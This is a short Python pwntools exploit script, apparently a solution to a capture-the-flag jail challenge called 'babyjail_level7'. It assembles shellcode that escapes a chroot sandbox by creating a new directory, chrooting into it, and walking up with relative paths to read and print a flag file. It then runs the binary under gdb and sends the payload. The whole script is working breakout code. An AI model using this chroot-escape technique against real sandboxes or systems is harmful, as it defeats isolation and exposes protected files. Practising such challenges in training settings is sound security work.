#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'


s = '''
b * main+1690
'''



target_file = "/etc"  # Any directory that exists
binary_path = './babyjail_level7'

shellcode = asm('''
    /* Create a new directory inside the jail */
    mov rax, 83         /* SYS_mkdir */
    lea rdi, [rip+new_dir]
    mov rsi, 0777       /* Permissions */
    syscall
    
    /* Overwrite the chroot with the new directory */
    mov rax, 161        /* SYS_chroot */
    lea rdi, [rip+new_dir]
    syscall
    
    /* Since we're still in the old jail but the chroot has changed,
       we can traverse up to the real filesystem */
    
    /* Open the real flag */
    mov rax, 2          /* SYS_open */
    lea rdi, [rip+flag_path]
    xor rsi, rsi        /* O_RDONLY */
    syscall
    
    /* Save flag fd */
    mov r15, rax
    
    /* Write flag to stdout using sendfile */
    mov rax, 40         /* SYS_sendfile */
    mov rdi, 1          /* stdout fd */
    mov rsi, r15        /* flag fd */
    xor rdx, rdx        /* offset */
    mov r10, 100        /* count */
    syscall
    
    jmp end

new_dir:
    .string "new_jail"
flag_path:
    .string "../../../../flag"  /* Navigate up to the real root and find flag */
end:
''')

p = process([binary_path, target_file])

gdb.attach(p, s)

p.send(shellcode)
p.interactive()
